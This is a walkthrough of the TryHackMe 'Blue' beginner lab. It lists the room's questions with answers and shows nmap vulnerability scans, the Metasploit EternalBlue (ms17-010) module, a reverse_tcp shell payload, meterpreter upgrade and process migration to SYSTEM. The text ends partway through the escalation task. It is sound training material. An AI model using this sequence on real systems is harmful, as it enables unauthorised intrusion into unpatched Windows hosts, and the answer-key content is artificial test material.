## Walkthrough
[https://tryhackme.com/room/blue](https://tryhackme.com/room/blue)

**Difficulty level:** Easy

## Task 1: Recon
Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused.


### Questions

Q1. Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room)

> "no answer needed"

Q2. How many ports are open with a port number under 1000?

> "3"

Q3. What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

> "ms17-010"


### MyWalk

Usually go with this scan...

```bash
nmap -T4 -sC -sV -Pn -oN nmap/initial 10.10.40.46
```
{: .nolineno }

But following the tip on Q1, about using some nmap scripting is very useful in this case:

```bash
nmap -sV -vv --script vuln 10.10.40.46
```
{: .nolineno }

We have now the answers to our questions above.

## Task 2: Gain Access

Exploit the machine and gain a foothold.

### Questions

Q1. Start Metasploit

> "No answer needed"

Q2. Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

> "exploit/windows/smb/ms17_010_eternalblue"

Q3. Show options and set the one required value. What is the name of this value? (All caps for submission)

> "RHOSTS"

Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:

```bash
set payload windows/x64/shell/reverse_tcp
```
{: .nolineno }

Q4. With that done, run the exploit!

> "No answer needed"

Q5. Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target. 

> "No answer needed"

## Task 2: Escalate

Escalate privileges, learn how to upgrade shells in metasploit.

### Questions

Q1. If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 

> "post/multi/manage/shell_to_meterpreter"
Hint: Google this: shell_to_meterpreter

Q2. Select this (use MODULE_PATH). Show options, what option are we required to change?

> "SESSION"

Q3. Set the required option, you may need to list all of the sessions to find your target here.  
Hint: "sessions -l"

> "No answer needed"

Q4. Run! If this doesn't work, try completing the exploit from the previous task once more.  
Hint: "Command: run (or exploit)"

> "No answer needed"

Q5. Once the meterpreter shell conversion completes, select that session for use.  
Hint: "sessions SESSION_NUMBER"

> "No answer needed"

Q6. List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).

> "No answer needed"

Q7. Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.
